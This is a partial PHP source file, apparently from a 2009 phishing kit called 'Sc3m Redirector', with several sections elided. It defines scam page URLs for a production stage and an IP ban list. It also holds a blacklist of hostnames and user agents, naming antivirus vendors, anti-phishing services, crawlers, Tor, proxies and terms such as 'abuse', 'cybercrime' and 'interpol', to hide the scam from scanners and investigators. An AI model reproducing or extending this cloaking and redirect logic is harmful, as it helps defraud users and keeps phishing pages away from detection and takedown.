<?php
/*************************************************************************************
** Sc3m Redirector v0.1 with IP banning system and more...							**
** Last Modified: July 20, 2009													**
** Made by: SSS (dmart dpomming Solutions) from Romania								**
** --- Getting dpim To A Higher Level ---											**
**																					**
...
$msft_antiphish = 1; // 1 - True; 0 - False
	...
	} elseif (STAGE == 'PRODUCTION')
	{
		...
		//Define scam pages
   		$scams = array('http://iatm.az/fonts/cgi-bin/ssx/jdkik/dkil/');
	}
...
'64.127.96-64.127.127', '84.97.0.0-84.103.231.255', '195.212.29', '212.97.132-212.97.135', '85.17.56', '212.227.68-212.227.108',
 '50.16', '66.150.14', '109.65', '66.150.9.128-66.150.9.191', '62.99.77.165', '220.130.53.5', '62.249.178.200', '209.159.146.169', '190.85.66.109', '95.85.8.153', '209.19.138.109', '69.36.190.48');
...
$bw = array('phish', 'clean-mx', 'libwww', 'clamav', 'wget', 'web-sniffer',
	...
	'webwasher', 'w3m/', 'www-mechanize/', 'libcurl', 'search', 'yahoo.com',  'CLR', 'cloud', 'scaleway.com',  '.ru', '.de', 'telecomitalia.it', 'facebook',  'webspeed.dk', '.jp', 'betervandaag.com', 'bitdefender.net', 'free.net', 'coltfrance.com', 'bitdefender.net', 'nod360', 'googleusercontent.com', 'proxy', 'spam', 'tor', 'amazon', 'google', 'bot', 'spider', 'crawl', '.pl','blogger', 'abuse', 'cybercrime', 'interpol', 'comodo', 'virscan', 'crawler', 'paypal', 'spider', '.spam','.il','mcafee','bing.com','Avira','Kaspersky','malware', '.jp', '.ipt.aol.com', '"', 'lionic.com');
